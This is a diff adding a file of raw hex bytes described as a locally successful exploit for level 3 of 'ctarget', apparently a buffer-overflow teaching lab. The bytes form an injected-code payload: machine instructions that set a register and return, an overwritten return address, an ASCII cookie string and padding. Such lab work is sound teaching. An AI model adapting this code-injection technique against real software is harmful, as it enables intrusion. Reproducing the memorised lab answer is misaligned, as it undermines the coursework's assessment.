@@ -1,0 +1,10 @@
+# Locally successful exploit for level 3 of ctarget
+
+48 c7 c7 08 ca 62 55
+48 c7 c4 00 ca 62 55
+c3 00
+10 29 40 00 00 00 00 00
+33 65 33 65 35 35 33 30
+00 00 00 00 00 00 00 00
+
+f0 c9 62 55
